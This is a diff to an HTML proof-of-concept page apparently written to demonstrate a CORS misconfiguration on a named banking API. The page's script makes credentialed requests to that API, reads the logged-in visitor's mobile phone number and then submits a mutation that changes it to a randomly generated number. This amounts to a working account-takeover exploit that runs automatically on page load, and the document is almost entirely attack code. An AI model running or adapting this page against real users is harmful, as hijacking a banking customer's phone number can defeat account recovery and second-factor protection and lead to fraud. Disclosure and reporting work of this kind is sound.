@@ -1,74 +1,69 @@
-
----
-
-### ✅ Updated `index.html` PoC (copyable)
-
-```html
 <!DOCTYPE html>
 <meta charset="utf-8">
 <title>Swan CORS Critical PoC</title>
 <style>
   body { font-family: system-ui; margin: 2rem; color: #111 }
   pre  { background: #f8f8f8; padding: 1rem; border: 1px solid #e1e1e1; overflow: auto }
-  code { color: #c7254e; background: #f9f2f4; padding: 0.2em 0.4em; }
+  code { color: #c7254e; background: #f9f2f4; padding: 0.2em 0.4em }
 </style>
 
 <h2>⚠️ Swan Banking – Critical CORS Misconfiguration PoC ⚠️</h2>
 <p>
   This page is served from <strong id="origin"></strong>.<br>
-  If your browser already holds <code>api.swan.io</code> cookies, every request below runs <em>automatically</em> – no JWT, no <code>X-Swan-Authenticator-Token</code> – because <code>Access-Control-Allow-Origin</code> echoes any <code>Origin</code> and <code>Access-Control-Allow-Credentials: true</code> forwards cookies.
+  All requests below run <em>automatically</em> with your <code>api.swan.io</code> cookies
+  (no JWT, no custom header).
 </p>
 
-<h3>Live log</h3><pre id="log">Running…</pre>
+<h3>Live log</h3>
+<pre id="log">Running…</pre>
 
 <script>
-  const log = t => (document.getElementById('log').textContent += t + '\n');
+  const log = t => document.getElementById('log').textContent += t + '\n';
   document.getElementById('origin').textContent = location.origin;
 
-  // Generic GraphQL fetch helper with credentials included
   async function gql(path, query) {
-    const r = await fetch(`https://api.swan.io${path}`, {
-      method: "POST",
-      credentials: "include",
-      headers: { "Content-Type": "application/json" },
+    const res = await fetch(`https://api.swan.io${path}`, {
+      method:  'POST',
+      credentials: 'include',
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ query })
     });
-    const body = await r.text();
-    log(`=== ${path} ===\nStatus: ${r.status} ${r.statusText}\n${body}\n`);
-    return JSON.parse(body);
+    const txt = await res.text();
+    log(`=== ${path} ===\nStatus: ${res.status} ${res.statusText}\n${txt}\n`);
+    return JSON.parse(txt).data;
   }
 
-  // 1) Try to read victim’s current phone number
-  gql("/admin-auth/graphql", "{ user { mobilePhoneNumber } }")
-    .then(body => {
-      let oldN;
-      if (body.data && body.data.user && body.data.user.mobilePhoneNumber) {
-        oldN = body.data.user.mobilePhoneNumber;
-        log(`[+] Victim’s phone: ${oldN}\n`);
-      } else {
-        oldN = "+33600000002";  // dummy fallback
-        log(`[!] Could not read phone – not logged in. Falling back to ${oldN}\n`);
-      }
+  (async () => {
+    // 1) Try to read the victim's number
+    let oldN = '+33600000002';
+    const whoami = await gql('/admin-auth/graphql', '{ user { mobilePhoneNumber } }');
+    if (whoami && whoami.user && whoami.user.mobilePhoneNumber) {
+      oldN = whoami.user.mobilePhoneNumber;
+      log(`✅ Read victim’s phone: ${oldN}\n`);
+    } else {
+      log(`⚠️ Could not read phone (not logged in) – using dummy: ${oldN}\n`);
+    }
 
-      // 2) Queue phone-number change with attacker-chosen values
-      const rand = Math.floor(100000 + Math.random()*900000);
-      const newN = `+3367${rand}`;
-      const mutation = `
-        mutation {
-          startPhoneNumberModification(input:{
-            oldPhoneNumber:"${oldN}",
-            newPhoneNumber:"${newN}"
-          }) {
-            __typename
-            ... on StartPhoneNumberModificationSuccessPayload {
-              phoneNumberModification { id }
-            }
-            ... on PhoneNumberModificationAlreadyExistsRejection { message }
-            ... on TooManyPhoneNumberModificationRejection { message }
+    // 2) Generate a valid new number: +33 6 XXXXXXXX (8 digits)
+    const rand8 = () => Math.floor(10000000 + Math.random() * 90000000);
+    const newN = '+336' + String(rand8());
+    log(`▶ Attempting change from ${oldN} → ${newN}\n`);
+
+    // 3) Queue the phone-change mutation
+    const mutation = `
+      mutation {
+        startPhoneNumberModification(input:{
+          oldPhoneNumber:"${oldN}",
+          newPhoneNumber:"${newN}"
+        }) {
+          __typename
+          ... on StartPhoneNumberModificationSuccessPayload {
+            phoneNumberModification { id }
           }
-        }`;
-
-      return gql("/admin-auth/graphql", mutation)
-        .then(() => log(`[+] Attempted new number: ${newN}`));
-    });
+          ... on PhoneNumberModificationAlreadyExistsRejection { message }
+          ... on TooManyPhoneNumberModificationRejection { message }
+        }
+      }`;
+    await gql('/admin-auth/graphql', mutation);
+  })();
 </script>
